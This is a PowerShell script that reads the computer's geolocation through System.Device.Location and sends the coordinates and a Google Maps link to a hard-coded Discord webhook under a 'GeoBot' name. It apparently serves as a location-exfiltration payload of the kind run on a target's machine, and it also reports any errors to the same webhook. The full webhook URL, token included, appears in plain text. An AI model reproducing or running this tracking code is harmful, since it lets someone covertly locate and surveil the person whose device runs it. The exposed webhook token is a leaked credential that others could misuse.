Add-Type -AssemblyName System.Device  # Required to access System.Device.Location namespace

# Your Discord webhook URL (fill this in)
$webhookUrl = 'https://discord.com/api/webhooks/1386838200089182319/DFvenBNwWaKMzXWX-HfhQy6IkkuGCo4yAcGKuTDs_IYpvrlWrXv0bnIyUNiV2GwYLvju'

function Send-DiscordEmbed {
    param(
        [string]$Title,
        [string]$Description,
        [int]   $Color = 15158332  # Red by default
    )

    $embed = @{
        username   = 'GeoBot'
        avatar_url = 'https://i.imgur.com/4M34hi2.png'
        embeds     = @(
            @{
                title       = $Title
                description = $Description
                color       = $Color
                timestamp   = (Get-Date).ToString("o")
            }
        )
    }

    try {
        Invoke-RestMethod -Uri $webhookUrl `
                          -Method Post `
                          -Body ($embed | ConvertTo-Json -Depth 4) `
                          -ContentType 'application/json'
    }
    catch {
        Write-Error "Failed to send error webhook: $_"
    }
}

try {
    # Create and start the GeoCoordinateWatcher
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()

    # Wait until we have a fix or the user denies permission
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
        Start-Sleep -Milliseconds 100
    }

    if ($GeoWatcher.Permission -eq 'Denied') {
        throw "Access Denied for Location Information"
    }

    # Grab the coordinates
    $location = $GeoWatcher.Position.Location
    if ($null -eq $location) {
        throw "Unable to retrieve location data."
    }

    $lat = $location.Latitude
    $lon = $location.Longitude
    $mapUrl = "https://www.google.com/maps?q=$lat,$lon"

    # Build and send success embed
    $successEmbed = @{
        username   = 'GeoBot'
        avatar_url = 'https://i.imgur.com/4M34hi2.png'
        embeds     = @(
            @{
                title  = 'Current Location'
                url    = $mapUrl
                color  = 3447003       # Blue
                fields = @(
                    @{ name = 'Latitude';  value = "$lat";           inline = $true },
                    @{ name = 'Longitude'; value = "$lon";           inline = $true },
                    @{ name = 'Map';       value = "[View on Google Maps]($mapUrl)"; inline = $false }
                )
                footer = @{
                    text = "Retrieved at $(Get-Date -Format u)"
                }
            }
        )
    }

    Invoke-RestMethod -Uri $webhookUrl `
                      -Method Post `
                      -Body ($successEmbed | ConvertTo-Json -Depth 4) `
                      -ContentType 'application/json'

    Write-Host "Location + map link sent to Discord webhook."
}
catch {
    # On any error, send an error embed with the message
    $errorMessage = $_.Exception.Message
    Send-DiscordEmbed -Title 'Error Retrieving Location' `
                      -Description $errorMessage `
                      -Color 15158332  # Red
    Write-Error "Script failed: $errorMessage"
}
